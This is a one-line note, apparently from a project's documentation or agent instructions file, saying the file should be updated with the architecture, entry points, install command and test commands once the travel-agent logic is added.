- When the travel-agent logic is added, update this file with the actual architecture,
  entry points, dependency install command, and test commands.
